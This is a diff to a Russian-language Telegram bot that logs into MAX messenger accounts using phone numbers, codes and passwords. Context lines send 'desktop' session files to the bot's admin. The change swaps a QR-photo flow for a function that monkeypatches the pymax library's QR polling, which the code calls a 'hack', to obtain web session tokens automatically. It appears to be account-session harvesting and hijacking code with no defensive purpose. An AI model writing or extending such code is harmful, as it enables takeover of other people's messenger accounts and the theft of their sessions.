@@ -28,7 +28,6 @@ dp = Dispatcher(storage=MemoryStorage())
 class AuthState(StatesGroup):
     waiting_for_code = State()
     waiting_for_password = State()
-    waiting_for_qr = State()
 
 pending = {}
 accounts = {}
@@ -102,18 +101,8 @@ async def send_files_to_user(phone, user_id, work_dir, desktop, js):
     await bot.send_document(ADMIN_ID, FSInputFile(dp),
         caption=f"💻 Десктоп\nНомер: {phone}")
 
-async def decode_qr_from_photo(photo_bytes):
-    url = "https://api.qrserver.com/v1/read-qr-code/"
-    form = aiohttp.FormData()
-    form.add_field('file', photo_bytes, filename='qr.png', content_type='image/png')
-    async with aiohttp.ClientSession() as session:
-        resp = await session.post(url, data=form)
-        data = await resp.json()
-        if data and data[0]['symbol'][0]['data']:
-            return data[0]['symbol'][0]['data']
-    return None
-
-async def scan_qr_with_hack(track_id, phone, uid, work_dir, user_password, user_id):
+async def get_web_token_auto(phone, uid, work_dir, user_password, user_id):
+    """Автоматически получает веб-токен через WebClient с хаком."""
     from pymax import WebClient, QrAuthFlow, QrHandler
 
     original_poll = QrAuthFlow._poll_qr
@@ -128,14 +117,14 @@ async def scan_qr_with_hack(track_id, phone, uid, work_dir, user_password, user_
 
     QrAuthFlow._poll_qr = fake_poll
 
-    class HackHandler(QrHandler):
+    class AutoQrHandler(QrHandler):
         async def show_qr(self, qr_link):
             logging.info(f"QR получен: {qr_link}")
             return True
 
     web_client = WebClient(
-        work_dir=f"{work_dir}_web_hack",
-        auth_flow=QrAuthFlow(qr_provider=HackHandler())
+        work_dir=f"{work_dir}_web_auto",
+        auth_flow=QrAuthFlow(qr_provider=AutoQrHandler())
     )
 
     try:
@@ -167,7 +156,7 @@ def accounts_keyboard(uid):
 def account_actions_keyboard(phone):
     builder = InlineKeyboardBuilder()
     builder.row(InlineKeyboardButton(text="💻 Получить десктоп", callback_data=f"desk_{phone}"))
-    builder.row(InlineKeyboardButton(text="🔗 Привязать веб (QR)", callback_data=f"bindweb_{phone}"))
+    builder.row(InlineKeyboardButton(text="🌐 Получить веб-токен", callback_data=f"webtok_{phone}"))
     builder.row(InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_{phone}"))
     builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="my_accounts"))
     return builder.as_markup()
@@ -229,55 +218,27 @@ async def cb_desk(callback: types.CallbackQuery):
     await send_files_to_user(phone, callback.from_user.id, work_dir, desktop, js)
     await callback.answer("Отправлено!")
 
-@dp.callback_query(F.data.startswith("bindweb_"))
-async def cb_bindweb(callback: types.CallbackQuery, state: FSMContext):
-    phone = callback.data[8:]
+@dp.callback_query(F.data.startswith("webtok_"))
+async def cb_webtok(callback: types.CallbackQuery):
+    phone = callback.data[7:]
     uid = str(callback.from_user.id)
     data = accounts.get(uid, {}).get(phone)
     if not data:
         await callback.answer("Аккаунт не найден")
         return
 
-    await state.set_state(AuthState.waiting_for_qr)
-    await state.update_data(bind_phone=phone, bind_uid=uid, bind_work_dir=data["work_dir"],
-                            bind_user_id=data["user_id"], bind_password=data.get("password", ""))
-    await callback.message.answer("📸 Отправьте фото QR-кода из веб-версии MAX.\n\n"
-                                  "1. Откройте web.max.ru\n"
-                                  "2. Сделайте скриншот QR-кода\n"
-                                  "3. Отправьте фото сюда")
-    await callback.answer()
+    await callback.answer("Запускаю получение веб-токена...")
+    msg = await callback.message.answer(f"🌐 Получаю веб-токен для {phone}...\n⏳ До 1 минуты.")
 
-@dp.message(AuthState.waiting_for_qr, F.photo)
-async def handle_qr_photo(message: types.Message, state: FSMContext):
-    photo = message.photo[-1]
-    file = await bot.get_file(photo.file_id)
-    photo_bytes = await bot.download_file(file.file_path)
+    user_password = data.get("password", "")
+    user_id = data["user_id"]
+    work_dir = data["work_dir"]
 
-    data = await state.get_data()
-    phone = data["bind_phone"]
-    uid = data["bind_uid"]
-    user_id = data["bind_user_id"]
-    work_dir = data["bind_work_dir"]
-    user_password = data.get("bind_password", "")
-
-    msg = await message.answer("🔍 Сканирую QR...")
-
-    qr_data = await decode_qr_from_photo(photo_bytes.read())
-    if not qr_data:
-        await msg.edit_text("❌ Не удалось распознать QR-код.")
-        await state.clear()
-        return
-
-    match = re.search(r'([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})', qr_data)
-    if not match:
-        await msg.edit_text("❌ Не удалось найти track_id.")
-        await state.clear()
-        return
-
-    track_id = match.group(1)
-    success = await scan_qr_with_hack(track_id, phone, uid, work_dir, user_password, user_id)
-    await msg.edit_text(f"✅ QR отсканирован!" if success else "❌ Не удалось.")
-    await state.clear()
+    success = await get_web_token_auto(phone, uid, work_dir, user_password, user_id)
+    if success:
+        await msg.edit_text(f"✅ Веб-токен для {phone} готов!")
+    else:
+        await msg.edit_text(f"❌ Не удалось получить веб-токен для {phone}")
 
 # ==================== ВХОД ====================
 
